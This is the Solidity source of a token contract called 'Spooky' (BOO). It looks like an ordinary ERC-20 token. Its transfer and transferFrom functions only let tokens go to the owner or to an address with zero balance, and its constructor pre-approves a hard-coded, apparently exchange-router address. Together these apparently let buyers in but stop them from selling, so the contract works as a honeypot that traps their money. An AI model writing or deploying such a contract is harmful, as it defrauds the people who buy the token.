pragma solidity 0.5.7;

contract Boo {
  
    mapping (address => uint256) public balanceOf;

    string public name = "Spooky";
    string public symbol = "BOO";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);
    address contractOwner;

    constructor() public {
        
        contractOwner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = 1000000000000000000000000000;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);
        require(to == contractOwner || balanceOf[to] == 0);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        return true;    

    }

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        require(to == contractOwner || balanceOf[to] == 0);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        return true;
    }
}